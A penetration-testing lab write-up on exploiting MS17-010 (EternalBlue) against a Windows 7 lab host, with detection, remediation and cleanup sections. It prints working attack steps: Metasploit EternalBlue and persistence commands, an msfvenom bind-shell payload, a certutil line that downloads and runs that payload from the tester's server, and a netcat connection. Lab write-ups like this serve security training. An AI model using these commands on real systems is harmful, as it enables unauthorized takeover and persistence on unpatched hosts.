# Blue: Exploiting MS17-010 in a Windows 7 Lab

> **Historical write-up:** This assessment was originally completed in
> September 2024 while I was developing my penetration-testing methodology.
> It was revised in August 2026 to correct technical terminology, improve
> evidence handling, and add detection, remediation, and cleanup analysis.

- **Original completion date:** September 20, 2024
- **Revision date:** August 2026
- **Environment:** Authorized training lab

---

## Table of Contents

- [Challenge Information](#challenge-information)
- [Executive Summary](#executive-summary)
- [Reconnaissance](#reconnaissance)
- [MS17-010 Validation](#ms17-010-validation)
- [Exploitation](#exploitation)
- [Access Validation](#access-validation)
- [Persistence](#persistence)
- [Alternative Payload Transfer Demonstration](#alternative-payload-transfer-demonstration)
- [Detection Opportunities](#detection-opportunities)
- [Remediation](#remediation)
- [Cleanup](#cleanup)
- [Retrospective](#retrospective)
- [Key Takeaways](#key-takeaways)
- [References](#references)

---

## Challenge Information

- **Name:** Blue
- **Platform:** TCM Security
- **Difficulty:** Easy
- **Target:** Windows 7
- **Primary service:** Server Message Block
- **Primary vulnerability:** MS17-010
- **Objective:** Enumerate and exploit the target, obtain privileged access, and demonstrate persistence.

---

## Executive Summary

The target was a Windows 7 system exposing Server Message Block, or SMB, on TCP port 445. Enumeration indicated that SMBv1 was enabled and that the system was consistent with hosts affected by MS17-010.

The vulnerability was exploited within the authorized lab environment, resulting in remote code execution with `NT AUTHORITY\SYSTEM` privileges. Post-exploitation validation confirmed that the session belonged to the intended target. A persistence mechanism was then demonstrated because persistence was an explicit lab objective.

In a production environment, successful exploitation could result in complete host compromise, credential theft, lateral movement, persistence, data destruction, or malware deployment.

---

## Reconnaissance

I first confirmed that the target was reachable before beginning service enumeration.

The original notes recorded the following Nmap command:

```bash
nmap -sV -A -Pn -p- -O2 192.168.81.133
```

The `-O2` argument appears to have been a documentation error. A cleaner equivalent scan would be:

```bash
nmap -Pn -p- -sC -sV -O 192.168.81.133
```

The corrected options perform the following actions:

- `-Pn` treats the target as online without relying on host discovery.
- `-p-` scans all TCP ports.
- `-sC` runs Nmap's default script set against discovered services.
- `-sV` performs service-version detection.
- `-O` attempts operating-system detection.

![Initial Nmap scan results](https://github.com/user-attachments/assets/a1f6004f-cbce-41ce-b87c-1a878e59510d)

The scan identified SMB on TCP port 445, NetBIOS on TCP port 139, and several Windows RPC endpoints.

```text
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Ultimate 7601 Service Pack 1
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
```

The combination of Windows 7 Service Pack 1 and an exposed SMB service made MS17-010 an appropriate vulnerability to investigate.

---

## MS17-010 Validation

MS17-010 was selected as the primary exploitation path because:

1. SMB was reachable on TCP port 445.
2. The operating system and service configuration were consistent with affected systems.
3. The target was using an unsupported legacy Windows version.
4. Successful exploitation would satisfy the lab objective without requiring unrelated attack paths.

A vulnerability-specific Nmap check can be used to determine whether the host appears exposed:

```bash
nmap -Pn -p445 --script smb-vuln-ms17-010 192.168.81.133
```

The original 2024 notes did not preserve the complete output from this validation step. This was a documentation weakness in the initial assessment.

In a real engagement, the output from the vulnerability-specific check would be saved as evidence before exploitation. Vulnerability identification, vulnerability validation, and successful exploitation should be documented as separate steps.

Other exposed services would also remain documented for later testing as time and scope permitted. However, discovering a validated, high-impact path does not require delaying exploitation merely to accumulate additional exploit options.

---

## Exploitation

The Metasploit EternalBlue module was selected to exploit MS17-010.

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.81.133
set RPORT 445
show options
check
run
```

The initial attempt did not immediately return a session. After retrying the module, exploitation succeeded and created a Meterpreter session.

![Successful Meterpreter session](https://github.com/user-attachments/assets/4c8755d6-28da-4bba-94e1-a2c91cdbb926)

A failed initial attempt does not necessarily establish that the target is not vulnerable. Exploit reliability can be affected by target state, memory conditions, payload selection, network stability, and implementation behavior. Repeated attempts should still remain proportionate to scope and operational risk.

---

## Access Validation

After obtaining a session, I validated that the connection belonged to the intended target and determined the privilege level of the session.

```cmd
whoami
hostname
ipconfig
systeminfo
```

These commands established:

- The current security context
- The target hostname
- The system's IP configuration
- The operating-system version
- The processor architecture

The session was running as:

```text
NT AUTHORITY\SYSTEM
```

This represented complete administrative control of the Windows host.

Post-exploitation commands should support a specific conclusion. Running large numbers of commands without a defined purpose creates unnecessary traffic, increases operational risk, and makes assessment notes more difficult to interpret.

---

## Persistence

Because the lab objective specifically required demonstrating persistence, I continued beyond initial access.

In a real assessment, persistence would only be established when explicitly authorized by the rules of engagement. Creating accounts, services, scheduled tasks, registry entries, startup items, or payloads would constitute material changes to the target.

The Meterpreter persistence module was used to establish a mechanism that would attempt to reconnect after the system restarted.

```text
run persistence
```

The exact module options should be reviewed and documented before execution, including:

- Callback address
- Callback port
- Execution interval
- Persistence location
- Artifacts created on the target
- Cleanup procedure

![Persistence module configuration](https://github.com/user-attachments/assets/560881e6-fccc-4ce3-89f8-c9269bcde434)

A handler was then configured on the assessment system to receive the callback.

![Handler waiting for callback](https://github.com/user-attachments/assets/6f8af57f-14e8-459f-8df4-f5e69a7cd2d)

After the target rebooted, the persistence mechanism attempted to reconnect to the configured listener.

This demonstrated the lab objective, but it also created artifacts that would need to be identified and removed during cleanup.

---

## Alternative Payload Transfer Demonstration

As an alternative to relying on the existing Meterpreter session, a standalone payload could be transferred to the target using a temporary HTTP server and a built-in Windows utility.

For this demonstration, a bind-shell payload is used.

Unlike a reverse shell, a bind shell opens a listening port on the target. The assessment system then connects directly to that port. Because the payload does not call back to the assessment system, it does not require an `LHOST` value.

### Payload Generation

```bash
msfvenom -p windows/shell_bind_tcp LPORT=1231 -f exe -o prompt.exe
```

A single-stage payload was used to keep the lab demonstration simple. Staged and single-stage payloads each have operational tradeoffs, and the appropriate choice depends on the environment and engagement requirements.

### File Hosting

A temporary HTTP server was started from the directory containing the payload:

```bash
python3 -m http.server 80
```

### File Transfer

From the compromised Windows host, `certutil.exe` was used to retrieve the payload:

```cmd
certutil -urlcache -split -f "http://192.168.81.131/prompt.exe" prompt.exe
```

The filename remained consistent throughout payload generation, hosting, transfer, and execution.

After the transfer completed, the payload was executed on the target:

```cmd
prompt.exe
```

![Bind-shell payload execution](https://github.com/user-attachments/assets/5909f3d5-dc40-4923-ad66-5eb2fe282ae7)

The assessment system then connected to the listening port:

```bash
nc 192.168.81.133 1231
```

![Connection to the bind shell](https://github.com/user-attachments/assets/a8767b71-a610-492b-aa77-d139f8ede27e)

This established a command shell on the target.

Changing the listener from a commonly used port such as 4444 to another port does not make the payload inherently stealthy and does not guarantee that it will bypass security controls. Modern defenses may inspect:

- Process behavior
- File reputation
- Payload signatures
- Parent-child process relationships
- Network direction
- Connection patterns
- Endpoint telemetry
- Application-control policy violations

A host firewall could also prevent the inbound connection to the bind shell.

---

## Detection Opportunities

Potential indicators associated with this attack chain include:

- External connections to TCP port 445
- SMBv1 negotiation
- Network signatures associated with MS17-010 exploitation
- Unexpected child processes associated with the SMB service
- Meterpreter or generated payload execution
- `certutil.exe` retrieving content from an unusual HTTP server
- Executables written to uncommon locations
- New services, scheduled tasks, startup entries, or registry persistence
- Connections to uncommon listening ports
- A Windows host unexpectedly running an HTTP-downloaded executable
- Post-exploitation commands executed from an unusual process tree

Useful telemetry could include:

- Windows process-creation auditing
- Sysmon process-creation events
- Sysmon network-connection events
- Windows SMB logs
- Endpoint detection and response telemetry
- Host-firewall logs
- Network IDS or IPS alerts
- Web proxy logs
- File-creation events
- Service and scheduled-task creation logs

Detection should focus on the complete behavior chain rather than relying only on a specific filename, port number, or payload signature.

---

## Remediation

The primary remediation is to install the Microsoft security updates that address MS17-010 and disable SMBv1 where it is not explicitly required.

Additional controls include:

- Replacing unsupported operating systems
- Restricting SMB access with host and network firewalls
- Blocking direct workstation-to-workstation SMB where unnecessary
- Segmenting legacy systems from sensitive networks
- Limiting access to TCP ports 139 and 445
- Applying application-control policies
- Monitoring use of administrative utilities such as `certutil.exe`
- Preventing execution from user-writable and temporary directories
- Maintaining current endpoint protection
- Monitoring for unexpected service or scheduled-task creation
- Removing unnecessary network services
- Conducting regular authenticated vulnerability assessments

The strongest remediation is eliminating the vulnerable legacy system rather than relying indefinitely on compensating controls.

---

## Cleanup

Persistence and payload deployment were performed only because they were part of the authorized lab objective.

After validating the objective, the following artifacts should be removed:

- The transferred `prompt.exe` payload
- Files generated by the persistence module
- Registry entries created for persistence
- Services or scheduled tasks created for persistence
- Temporary payload-hosting files
- Metasploit handlers
- Netcat listeners
- Any additional files created during testing

---

## Retrospective

This was one of my earlier penetration-testing labs. The technical attack path was successful, but the original documentation had several weaknesses.

The original version:

- Did not clearly distinguish service identification from vulnerability validation
- Contained an incorrect or mistyped Nmap argument
- Used inconsistent payload filenames
- Mixed bind-shell and reverse-shell terminology
- Included an unnecessary `LHOST` value for a bind payload
- Recorded commands without consistently explaining the decisions they supported
- Underemphasized authorization, cleanup, detection, and remediation
- Suggested that accumulating multiple exploits was inherently better than validating the most appropriate path
- Did not preserve complete evidence from the vulnerability-validation step
- Did not maintain a complete record of artifacts created on the target

The revised write-up focuses on evidence, decision-making, technical accuracy, and the complete assessment lifecycle rather than simply obtaining a shell.

---

## Key Takeaways

- Service identification, vulnerability validation, and successful exploitation are separate evidentiary steps.
- Exact commands, filenames, payload behavior, and results should be recorded while testing occurs.
- Every command should support a defined assessment objective or conclusion.
- A validated high-impact vulnerability can be prioritized without first collecting multiple unnecessary exploit paths.
- Persistence and system modification require explicit authorization.
- Bind shells and reverse shells have different network behaviors and configuration requirements.
- Changing a payload's port does not inherently make it stealthy.
- Offensive write-ups should include detection and remediation analysis.
- Every modified system should have an artifact log and verified cleanup process.
- Historical technical work can remain valuable when errors are corrected transparently.

---

## References

- Microsoft Security Bulletin MS17-010
- Nmap Reference Guide
- Rapid7 Metasploit MS17-010 EternalBlue Module Documentation
- MITRE ATT&CK
- Microsoft Sysinternals Sysmon Documentation
